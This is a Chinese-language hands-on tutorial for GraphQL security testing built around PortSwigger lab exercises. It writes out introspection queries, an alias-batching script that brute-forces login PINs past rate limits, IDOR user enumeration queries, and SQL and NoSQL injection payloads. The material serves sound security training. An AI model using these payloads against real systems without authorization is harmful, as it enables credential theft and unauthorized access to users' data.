# GraphQL安全测试 — 实战练习指南

> 本练习主要使用 PortSwigger Web Security Academy 的免费 GraphQL Labs。
> 不需要本地部署，浏览器直接访问即可。

---

## 环境准备

```
[必备] PortSwigger 账号（免费注册）
  https://portswigger.net/web-security/graphql

[推荐] Burp Suite 社区版
  用于拦截和修改 GraphQL 请求
  下载：https://portswigger.net/burp/communitydownload

[可选] InQL Burp 插件
  Burp → Extensions → BApp Store → 搜索 InQL → Install
  用于自动化内省和API发现

curl 或 Postman
  用于手动发送 GraphQL 请求
```

---

## 练习1：手动发送 GraphQL 请求（基础）

```
GraphQL 请求的格式和普通 HTTP 请求不同：
所有请求都是 POST，Body 是 JSON 格式的 query 字段。

用 curl 练习（在终端中运行）：

# 内省查询 — 发现 GraphQL 的完整结构
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __schema { queryType { name } types { name fields { name } } } }"
  }'

# 查询特定类型的字段
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __type(name: \"User\") { name fields { name type { name } } } }"
  }'

观察：
  如果内省成功 → 返回 JSON，包含类型和字段名
  如果返回 {"errors":[{"message":"Introspection disabled"}]} → 内省被禁用

把上面的 target.com 换成 PortSwigger Lab 的地址来练习
```

---

## 练习2：PortSwigger GraphQL Lab 1 — 内省发现隐藏数据

```
Lab 地址：
  https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts

目标：通过内省发现隐藏字段，读取私密内容

步骤：

2.1 找到 GraphQL 端点
  常见路径：/graphql, /api/graphql, /api, /query
  在 Burp 中打开站点，观察 Network 请求
  或直接尝试 POST /graphql

2.2 发送内省查询
  在 Burp Repeater 或 curl 中发送：
  {
    "query": "{ __schema { types { name fields { name } } } }"
  }

  观察返回结果，找到所有类型名和字段名

2.3 寻找隐藏字段
  找到 Post 类型（或博客文章相关类型）
  检查是否有 isPrivate, hidden, draft 这类字段
  检查是否有 postPassword, secretContent 这类字段

2.4 构造查询读取隐藏内容
  { posts { id title content isPrivate } }
  如果 isPrivate=true 的帖子也返回了内容 → 存在访问控制问题

Expected 结果：
  发现通常对普通用户隐藏的字段，能读取私密内容

常见陷阱：
  有些字段名在内省中不显示（使用了字段级访问控制）
  → 尝试猜测字段名：password, hash, secret, internal, admin
  → { user(id: "1") { name email password } }
```

---

## 练习3：PortSwigger GraphQL Lab 2 — 批量别名绕过速率限制

```
Lab 地址：
  https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass

目标：用 GraphQL 别名特性绕过登录频率限制，暴力破解 PIN 码

步骤：

3.1 理解别名的语法
  GraphQL 别名让同一个查询中可以有多个同名操作：
  {
    login1: login(username: "admin", password: "0000") { success }
    login2: login(username: "admin", password: "0001") { success }
    login3: login(username: "admin", password: "0002") { success }
  }

3.2 生成批量 mutation（手动或脚本）

  Python 脚本生成 100 个 PIN 码的批量 mutation：

  mutations = []
  for i in range(100):
      pin = str(i).zfill(4)  # 0000, 0001, ... 0099
      mutations.append(
          f'l{i}: login(input: {{username: "carlos", password: "{pin}"}}) '
          f'{{ token success }}'
      )
  query = "mutation { " + " ".join(mutations) + " }"

  在 Python 中运行（不需要靶场，先理解格式）：
  python3 -c "
  mutations = []
  for i in range(10):
      pin = str(i).zfill(4)
      mutations.append(f'l{i}: login(input: {{username: \"admin\", password: \"{pin}\"}}) {{ success }}')
  print('mutation {', ' '.join(mutations), '}')
  "

3.3 在 Burp Repeater 中发送
  复制上面生成的 mutation 字符串
  Body: {"query": "<生成的mutation>"}

3.4 观察响应
  找到 success: true 的那个别名（如 l42）
  → l42 对应密码 "0042"

Expected 结果：
  服务端的速率限制（每个 IP 每分钟 X 次）只计算了 HTTP 请求数
  100 个 mutation 在一个 HTTP 请求中 → 完全绕过限制
```

---

## 练习4：发现 GraphQL 端点（真实场景模拟）

```
在真实测试中，GraphQL 端点可能不在 /graphql，需要主动发现。

4.1 常见端点路径
  /graphql
  /api/graphql
  /api
  /query
  /gql
  /graphiql
  /v1/graphql
  /v2/graphql

4.2 用 Burp 的内容发现功能
  Target → 右键站点 → Engagement tools → Discover content
  会自动扫描这些路径

4.3 通过请求特征识别 GraphQL
  GraphQL 端点通常：
  - 接受 Content-Type: application/json
  - 请求体包含 "query" 字段
  - 响应包含 "data" 或 "errors" 字段
  - 错误响应包含 {"errors":[...]} 格式

4.4 测试是否是 GraphQL 端点
  发送：
  POST /api
  {"query": "{__typename}"}

  如果返回 {"data":{"__typename":"Query"}} → 确认是 GraphQL
  （__typename 是 GraphQL 内置查询，永远有效）
```

---

## 练习5：授权测试（IDOR 测试）

```
GraphQL 中的 IDOR 测试和 REST API 类似，但需要关注字段级授权。

5.1 用两个账号测试
  账号A（普通用户）：Token-A
  账号B（另一个普通用户）：Token-B

5.2 用账号A查询账号B的数据
  用 Token-A 发送：
  { "query": "{ user(id: \"账号B的ID\") { name email phone orders { id total } } }" }

  期望：
    安全的实现 → 返回错误或只返回公开信息
    有漏洞的实现 → 返回账号B的完整信息

5.3 枚举用户（批量 IDOR）
  {
    u1: user(id: "1") { id name email }
    u2: user(id: "2") { id name email }
    u3: user(id: "3") { id name email }
    ...
    u20: user(id: "20") { id name email }
  }
  → 批量枚举所有用户

5.4 逐字段测试授权
  先查询安全字段：{ user(id: "2") { name } }
  再逐步加入敏感字段：
  { user(id: "2") { name email } }
  { user(id: "2") { name email phone } }
  { user(id: "2") { name email phone passwordHash } }

  找到哪个字段没有授权检查
```

---

## 练习6：注入测试

```
GraphQL 中的注入和传统注入一样，只是 payload 格式不同。

6.1 发现注入点
  关注这类参数：search, filter, name, query, where, keyword

6.2 基础注入测试
  正常请求：
  { "query": "{ searchUsers(name: \"admin\") { id name } }" }

  注入测试：
  { "query": "{ searchUsers(name: \"admin'\") { id name } }" }
  { "query": "{ searchUsers(name: \"admin' OR 1=1 --\") { id name } }" }

6.3 观察响应差异
  正常响应 → 没有错误，返回正常数据
  注入有效 → 返回 SQL 错误，或者返回了更多数据
  → 如果 OR 1=1 返回了所有用户，确认 SQL 注入

6.4 NoSQL 注入（MongoDB）
  { "query": "{ user(name: {\"$gt\": \"\"}) { id name email } }" }
  → 如果返回了所有用户，存在 NoSQL 注入
```

---

## 自测验收

完成以上练习后，检查自己能否：

- [ ] 手动发送内省查询，解读返回的 Schema
- [ ] 用 __typename 判断一个端点是否是 GraphQL
- [ ] 构造一个包含 10 个别名的批量 mutation
- [ ] 在 PortSwigger 完成至少 2 个 GraphQL Lab
- [ ] 用两个账号验证 GraphQL 的字段级授权
- [ ] 对 GraphQL 的搜索参数进行基础注入测试

---

> **下一步：** 给发现的 GraphQL 漏洞打 CVSS 分数 → [04 CVSS评级](../04-cvss-severity/README.md)
